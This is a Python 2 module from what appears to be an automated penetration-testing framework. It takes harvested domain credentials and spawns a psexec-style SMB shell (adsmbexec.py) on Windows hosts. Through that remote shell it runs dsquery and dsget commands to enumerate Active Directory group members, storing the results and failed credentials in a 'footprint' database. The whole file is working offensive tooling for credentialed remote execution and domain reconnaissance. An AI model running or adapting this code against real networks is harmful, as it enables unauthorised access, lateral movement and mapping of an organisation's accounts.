import time
import asyncproc
import os
import base64
from msf import exploit

def CountDomainGroupsToExpand(params):
    count = 0

    cursor = params.db.cursor()
    cursor.execute("select * from countdomaingroupstoexpand(%s)", (params.footprint_id, ))
    for r in cursor.fetchall():
        count = r[0]
    cursor.close()

    return count

def GetDomainGroupToExpand(params):
    result = None

    cursor = params.db.cursor()
    cursor.execute("select * from getdomaingrouptoexpand(%s)", (params.footprint_id, ))
    result = cursor.fetchone()
    cursor.close()

    return result

def AddTaskListItem(params, domain_group_id):
    cursor = params.db.cursor()
    cursor.execute("select addTaskListItem(%s, 26, %s, true, false)", (params.footprint_id, domain_group_id, ))
    task_id = cursor.fetchone()[0]
    cursor.close()
    return task_id

def GetProcess(params, domain, username, password, host, map_id):
    proc = None
    #try:
    if True:
        proc = asyncproc.Process(["./software/adsmbexec.py", "{}/{}:{}@{}".format(domain, username, password, host)])
        runWithDifferentUser = False
        gotShell = False
        startTime = time.time()
        while True:
            poll = proc.wait(os.WNOHANG)
            out = proc.read()
            time.sleep(0.25)
        
            if time.time() - startTime >= 60:
                #print "too much time has passed. quitting"
                #log = log + "too much time has passed. quitting" + "\r\n"
                #params.log("too much time has passed. quitting")

                break
        
            if out != "": 
                print out
        
            if out.upper().find("Windows".upper()) > -1:
                gotShell = True
                break
            elif out.upper().find("STATUS_SHARING_VIOLATION".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("SMB SessionError".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("rpc_x_bad_stub_data".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("Unexpected answer from server".upper()) > -1:
                proc = None
                runWithDifferentUser = True
                break
            elif out.upper().find("The target principal name is incorrect".upper()) > -1:
                runWithDifferentUser = True
                # TODO update this host, set psexec_failed = true
            elif out.upper().find("'dsquery' is not recognized as an internal or external command".upper()) > -1:
                runWithDifferentUser = True
        if runWithDifferentUser:
            cursor = params.db.cursor()
            cursor.execute("update domain_credentials_map set dgu_failed = true where id = %s", (map_id, ))
            cursor.close()
 
    return proc

def runCmd(proc, cmd):
    proc.write(cmd + "\n")
    time.sleep(0.5)
    result = ""
    gotShell = False

    startTime = time.time()
    while gotShell == False:
        poll = proc.wait(os.WNOHANG)
        out = proc.read()
        time.sleep(0.25)

        if time.time() - startTime >= 120:
            print "too much time has passed. quitting"
            return ""

        if out != "":
            result += result + out
        if out.upper().find("Windows".upper()) > -1:
            gotShell = True
    return result


def AddDomainUserToGroup(params, domain_id, user, group_id):
    cursor = params.db.cursor()
    cursor.execute("select addDomainUserToGroup(%s, %s, %s, %s)",  (params.footprint_id, domain_id, user, group_id, ))
    cursor.close() 


def run(params):
    if CountDomainGroupsToExpand(params) > 0:
        starttime = time.time()
        
        group_info = GetDomainGroupToExpand(params)
        print group_info
        out = ""
        proc = GetProcess(params, group_info[2], group_info[3], group_info[4], group_info[1], group_info[5])
        if proc != None:
            while CountDomainGroupsToExpand(params) > 0 and (time.time() - starttime) < 60 * 5 and out != "timeout":
                group_info = GetDomainGroupToExpand(params)
                if group_info == None:
                    print "nothing left to do, so quitting"
                    #runCmd(proc, "exit")
                    
                    break
                else:
                    task_id = AddTaskListItem(params, group_info[7])
                    task_output = ""
                    
                    #cmd = """cmd /C "dsquery group -name "{0}" | dsget group -members" """.format(group_info[6])
                    cmd = """cmd /C "dsquery group -name "{0}" | dsget group -members | dsget user -samid" """.format(group_info[6])
                    print cmd
                    out = runCmd(proc, cmd)
                    print out
                    task_output = "{}\n\n{}".format(cmd, out)
                    
                    for l in out.split("\n"):
                        #print "DEBUG ::: [{}]".format(l)
                        if l.find("'dsquery' is not recognized as an internal or external command") != -1:
                            out = "timeout"
                        else:
                            l = l[:-1]
                            #print "[{}] [{}]".format(l, l[:2])
                            if l[:2] == "  ":
                                if l.strip() != "samid":
                                    #print "add user [{}] to group [{}][{}]".format(l.strip(), group_info[0], group_info[7])
                                    AddDomainUserToGroup(params, group_info[0], l.strip(), group_info[7])
#                            if l[2:] == "  ":
#                            if l not in [ "", "C:\Windows\system32", "timeou" ] and l.find("CN=Users") != -1:
#                                user =  l.split(",")[0].split("=")[1]
#                        
#                                add_user = True
#                                users_blacklist = [ "SystemMailbox", "DiscoverySearchMailbox", "FederatedEmail" ]
#                                for u in users_blacklist:
#                                    if user.find(u) > -1:
#                                        add_user = False
#                                        break
#
#                                if add_user:
#                                    AddDomainUserToGroup(params, group_info[0], user[:45], group_info[7])
                    
                    if out == "timeout":
                        print "DEBUG ::: run as different user"
                        cursor = params.db.cursor()
                        cursor.execute("update domain_credentials_map set dgu_failed = true where id = %s", (group_info[5], ))
                        cursor.close()

                        spCursor = params.db.cursor()
                        spCursor.execute("select updateTaskStatus(%s, %s, %s, %s)",  ( task_id,  False,  False, base64.b64encode(task_output), ))
                        spCursor.close()

                        #spCursor = params.db.cursor()
                        #spCursor.execute("update domain_groups set users_gathered = true where id = %s", (group_info[7], ))
                        #spCursor.close()
                    else:
                        
                        spCursor = params.db.cursor()
                        spCursor.execute("update domain_groups set users_gathered = true where id = %s", (group_info[7], ))
                        spCursor.close()

                        spCursor = params.db.cursor()
                        spCursor.execute("select updateTaskStatus(%s, %s, %s, %s)",  ( task_id,  False,  True, base64.b64encode(task_output), ))
                        spCursor.close()

                    time.sleep(0.5)
                  
            
            time.sleep(0.5)
            proc.write("exit\n")
            time.sleep(1)
